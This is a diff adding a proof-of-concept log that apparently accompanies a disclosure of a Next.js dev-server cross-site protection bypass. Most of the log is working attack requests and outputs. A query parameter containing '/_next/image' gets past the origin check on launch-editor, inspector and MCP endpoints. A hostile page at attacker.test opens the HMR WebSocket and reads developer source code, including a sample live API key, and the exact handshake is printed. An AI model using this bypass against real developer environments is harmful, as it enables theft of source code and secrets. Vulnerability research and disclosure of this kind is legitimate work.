@@ -1,0 +1,88 @@
+================================================================
+ Next.js next dev - blockCrossSiteDEV total bypass via the
+ isInternalEndpoint() ignore-list substring test
+ next@16.3.4   Node v22.22.2   Fri Sep  4 01:46:27 UTC 2026
+================================================================
+
+--- 1. The control works normally (hostile Origin, plain URL) ---
+  /__nextjs_launch-editor?file=/etc/passwd                               -> 403
+  /__nextjs_attach-nodejs-inspector                                      -> 403
+  /__nextjs_launch-editor?file=/etc/passwd                               -> 403
+
+--- 2. Appending a query param whose VALUE contains an ignore-list path ---
+  /__nextjs_launch-editor?file=/etc/passwd&x=/_next/image                -> 204
+  /__nextjs_attach-nodejs-inspector?x=/_next/image                       -> 200
+  /__nextjs_launch-editor?file=/etc/passwd&x=/_next/image                -> 204
+  /__nextjs_launch-editor?file=/etc/passwd&x=/_next/static/media         -> 204
+  /__nextjs_launch-editor?file=/etc/passwd&x=/_next/static/immutable/media -> 204
+
+  The Origin: null row is the case CVE-2026-27977 / GHSA-jcc7-9wpm-mj36
+  specifically patched. It is reachable again.
+
+--- 3. POST endpoints, previously unreachable cross-site, now open ---
+  POST /_next/mcp  tools/list  (plain URL, hostile Origin)               -> 403
+  POST /_next/mcp?x=/_next/image  tools/list  (hostile Origin)           -> 200
+
+  The unauthenticated dev MCP server answers. Tools it exposes:
+    "name":"get_project_metadata"
+    "name":"get_errors"
+    "name":"get_page_metadata"
+    "name":"get_logs"
+    "name":"get_server_action_by_id"
+    "name":"get_routes"
+    "name":"get_request_insights"
+    "name":"get_compilation_issues"
+    "name":"compile_route"
+
+--- 4. HMR WebSocket upgrade with a hostile Origin ---
+=== HMR WebSocket upgrade, hostile Origin: http://evil.test ===
+  plain /_next/hmr (expect rejected)             -> rejected: Parse Error: Expected HTTP/, RTSP/ or ICE/
+  /_next/hmr?x=/_next/image  (bypass)            -> UPGRADE ACCEPTED
+
+  A WebSocket is not subject to the Same-Origin Policy: the browser sends
+  Origin and leaves enforcement entirely to the server. With the gate
+  bypassed, an attacker page can open and READ this socket.
+
+--- 5. Real Chromium: attacker.test reads the developer's source code ---
+attacker socket state: OPEN
+
+12 messages read cross-site by attacker.test.
+
+5 of them carry build-error / source detail. Excerpts:
+
+  {"type":"sync","errors":[],"warnings":[],"hash":"","versionInfo":{"staleness":"fresh","installed":"16.3.4"},"debug":{},"devIndicator":{"disabledUntil":0},"devToolsConfig":{}}
+  ----------------------------------------------------------------------
+  {"type":"built","hash":"2","errors":[],"warnings":[]}
+  ----------------------------------------------------------------------
+  {"type":"built","hash":"2","errors":[],"warnings":[]}
+  ----------------------------------------------------------------------
+  {"type":"built","hash":"3","errors":[{"message":"./app/page.js:3:1
+  Error: Expected '}', got '<eof>'
+    \u001b[90m1 |\u001b[0m \u001b[36mconst\u001b[0m \u001b[33mAPI_KEY\u001b[0m = \u001b[32m\"sk-live-51H9xQ2rTvB8mNpK4wZ\"\u001b[0m
+    \u001b[90m2 |\u001b[0m \u001b[36mexport\u001b[0m \u001b[36mdefault\u001b[0m \u001b[36mfunction\u001b[0m \u001b[33mHome\u001b[0m() { \u001b[36mreturn\u001b[0m <main>nextlab home</main >
+  \u001b[31m\u001b[1m>\u001b[0m \u001b[90m3 |\u001b[0m
+    \u001b[90m  |\u001b[0m \u001b[31m\u001b[1m^\u001b[0m
+  
+  Parsing ecmascript source code failed
+  
+  "}],"warnings":[]}
+  ----------------------------------------------------------------------
+
+  absolute project path present in stream : false
+  developer source code present in stream : true
+
+--- 6. The exact handshake Chromium put on the wire ---
+    GET /_next/hmr?x=/_next/image HTTP/1.1
+    Host: victimdev.test:3021
+    Connection: Upgrade
+    Pragma: no-cache
+    Cache-Control: no-cache
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/141.0.0.0 Safari/537.36
+    Upgrade: websocket
+    Origin: http://attacker.test:8899
+    Sec-WebSocket-Version: 13
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.9
+    Sec-WebSocket-Key: vQBbbMexWqZq66e/tbFqlQ==
+    Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
+    ===
